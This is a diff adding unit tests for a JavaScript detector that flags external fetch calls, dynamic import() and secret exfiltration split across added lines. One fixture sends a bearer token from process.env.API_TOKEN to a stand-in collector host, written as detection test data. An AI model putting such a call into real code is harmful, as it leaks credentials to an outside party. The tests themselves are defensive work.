@@ -178,6 +178,72 @@ test('js detector ignores static import() with a string-literal specifier', () =
   assert.equal(findings.find((f) => f.kind === 'capability_echo.dynamic_eval_added'), undefined);
 });
 
+test('js detector flags fetch() with URL on the next added line (split-line)', () => {
+  const findings = detectJsCapability([
+    { file: 'src/api.ts', line: 4, content: '  await fetch(' },
+    { file: 'src/api.ts', line: 5, content: "    'https://api.example.com/v1/events'," },
+    { file: 'src/api.ts', line: 6, content: '  );' }
+  ]);
+
+  const f = findings.find((finding) => finding.kind === 'capability_echo.external_fetch_added');
+  assert.ok(f, 'split-line fetch was not flagged');
+  assert.equal(f.line, 4, 'annotation should point at the call line, not the URL line');
+});
+
+test('js detector keeps same-origin split-line fetch quiet', () => {
+  const findings = detectJsCapability([
+    { file: 'src/api.ts', line: 4, content: '  await fetch(' },
+    { file: 'src/api.ts', line: 5, content: "    '/internal/events'," },
+    { file: 'src/api.ts', line: 6, content: '  );' }
+  ]);
+
+  assert.equal(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'), undefined);
+});
+
+test('js detector flags split-line secret exfiltration over fetch', () => {
+  const findings = detectJsCapability([
+    { file: 'src/api.ts', line: 4, content: '  await fetch(' },
+    { file: 'src/api.ts', line: 5, content: "    'https://collector.example.com/events'," },
+    { file: 'src/api.ts', line: 6, content: '    { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } }' },
+    { file: 'src/api.ts', line: 7, content: '  );' }
+  ]);
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil, 'split-line secret exfil was not flagged');
+  assert.equal(exfil.line, 4);
+});
+
+test('js detector flags dynamic import() with the specifier on the next line', () => {
+  const findings = detectJsCapability([
+    { file: 'src/loader.ts', line: 8, content: '  const mod = await import(' },
+    { file: 'src/loader.ts', line: 9, content: '    pluginName' },
+    { file: 'src/loader.ts', line: 10, content: '  );' }
+  ]);
+
+  assert.ok(findings.some((f) => f.kind === 'capability_echo.dynamic_eval_added'));
+});
+
+test('js detector does not flag static import() with the specifier on the next line', () => {
+  const findings = detectJsCapability([
+    { file: 'src/loader.ts', line: 8, content: '  const mod = await import(' },
+    { file: 'src/loader.ts', line: 9, content: "    './plugin.js'" },
+    { file: 'src/loader.ts', line: 10, content: '  );' }
+  ]);
+
+  assert.equal(findings.find((f) => f.kind === 'capability_echo.dynamic_eval_added'), undefined);
+});
+
+test('js detector lookahead stops at gaps in added-line coverage', () => {
+  // line 5 isn't part of the added set, so the URL on line 6 is treated as
+  // unrelated to the fetch on line 4. No URL same-line, no URL adjacent.
+  const findings = detectJsCapability([
+    { file: 'src/api.ts', line: 4, content: '  await fetch(' },
+    { file: 'src/api.ts', line: 6, content: "    'https://api.example.com/v1/events'," }
+  ]);
+
+  assert.equal(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'), undefined);
+});
+
 test('workflow detector flags write permissions', () => {
   const findings = detectWorkflowPermissions([
     {
